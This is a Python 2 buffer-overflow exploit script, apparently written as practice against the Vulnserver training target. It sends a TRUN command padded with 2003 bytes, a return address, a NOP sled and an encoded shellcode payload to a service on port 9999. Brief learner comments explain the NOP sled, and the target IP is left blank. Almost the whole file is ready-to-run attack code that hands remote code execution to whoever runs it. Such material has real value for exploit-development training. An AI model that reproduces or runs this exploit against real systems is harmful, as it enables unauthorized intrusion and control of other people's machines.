#! /usr/bin/python

import sys, socket 

overflow = ("\xdb\xd0\xbf\x28\xbf\x95\xa1\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x83\xc5\x04\x31\x7d\x13\x03\x55\xac\x77\x54\x59\x3a\xf5"
"\x97\xa1\xbb\x9a\x1e\x44\x8a\x9a\x45\x0d\xbd\x2a\x0d\x43\x32"
"\xc0\x43\x77\xc1\xa4\x4b\x78\x62\x02\xaa\xb7\x73\x3f\x8e\xd6"
"\xf7\x42\xc3\x38\xc9\x8c\x16\x39\x0e\xf0\xdb\x6b\xc7\x7e\x49"
"\x9b\x6c\xca\x52\x10\x3e\xda\xd2\xc5\xf7\xdd\xf3\x58\x83\x87"
"\xd3\x5b\x40\xbc\x5d\x43\x85\xf9\x14\xf8\x7d\x75\xa7\x28\x4c"
"\x76\x04\x15\x60\x85\x54\x52\x47\x76\x23\xaa\xbb\x0b\x34\x69"
"\xc1\xd7\xb1\x69\x61\x93\x62\x55\x93\x70\xf4\x1e\x9f\x3d\x72"
"\x78\xbc\xc0\x57\xf3\xb8\x49\x56\xd3\x48\x09\x7d\xf7\x11\xc9"
"\x1c\xae\xff\xbc\x21\xb0\x5f\x60\x84\xbb\x72\x75\xb5\xe6\x1a"
"\xba\xf4\x18\xdb\xd4\x8f\x6b\xe9\x7b\x24\xe3\x41\xf3\xe2\xf4"
"\xa6\x2e\x52\x6a\x59\xd1\xa3\xa3\x9e\x85\xf3\xdb\x37\xa6\x9f"
"\x1b\xb7\x73\x0f\x4b\x17\x2c\xf0\x3b\xd7\x9c\x98\x51\xd8\xc3"
"\xb9\x5a\x32\x6c\x53\xa1\xd5\x53\x0c\xb4\xfa\x3c\x4f\xc6\x15"
"\xe1\xc6\x20\x7f\x09\x8f\xfb\xe8\xb0\x8a\x77\x88\x3d\x01\xf2"
"\x8a\xb6\xa6\x03\x44\x3f\xc2\x17\x31\xcf\x99\x45\x94\xd0\x37"
"\xe1\x7a\x42\xdc\xf1\xf5\x7f\x4b\xa6\x52\xb1\x82\x22\x4f\xe8"
"\x3c\x50\x92\x6c\x06\xd0\x49\x4d\x89\xd9\x1c\xe9\xad\xc9\xd8"
"\xf2\xe9\xbd\xb4\xa4\xa7\x6b\x73\x1f\x06\xc5\x2d\xcc\xc0\x81"
"\xa8\x3e\xd3\xd7\xb4\x6a\xa5\x37\x04\xc3\xf0\x48\xa9\x83\xf4"
"\x31\xd7\x33\xfa\xe8\x53\x53\x19\x38\xae\xfc\x84\xa9\x13\x61"
"\x37\x04\x57\x9c\xb4\xac\x28\x5b\xa4\xc5\x2d\x27\x62\x36\x5c"
"\x38\x07\x38\xf3\x39\x02")


# here add we have nops which --> no operation
#this is imp because our code might not even work if there was no nops , due to interference . Thus adding nops here 
#depends on payload size 

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow 


try:

	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('' , 9999)) # windows ip and port to be given in 

	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:

	print "Eroor connecting to the server "	
	sys.exit()

		

